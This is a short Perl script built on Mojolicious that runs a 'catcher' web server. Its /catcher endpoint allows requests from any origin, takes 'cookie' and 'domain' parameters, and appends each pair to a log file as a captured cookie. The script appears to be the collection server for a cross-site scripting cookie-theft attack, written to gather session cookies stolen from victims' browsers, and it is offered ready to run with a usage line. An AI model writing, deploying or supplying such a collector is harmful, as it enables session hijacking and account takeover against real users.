#!/usr/bin/env perl
# Usage: perl catcher.pl daemon -m production -l http://*:8080

use 5.018;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/catcher" => sub ($catcher) {
	$catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");
	$catcher -> res -> headers -> header("Access-Control-Allow-Method" => "GET, POST, OPTIONS");
	$catcher -> res -> headers -> header("Access-Control-Allow-Headers" => "X-Requested-With, Content-Type, Accept");

	my $cookie = $catcher -> param("cookie");
	my $domain = $catcher -> param("domain");
	
	open (my $logs, ">>", "catcher.logs");
	print $logs "[+] - New cookie '$cookie' from '$domain' has been catch.\n";
	close ($logs);

	return (
		$catcher -> render (
			text => "Ok"
		)
	);
};

app -> start();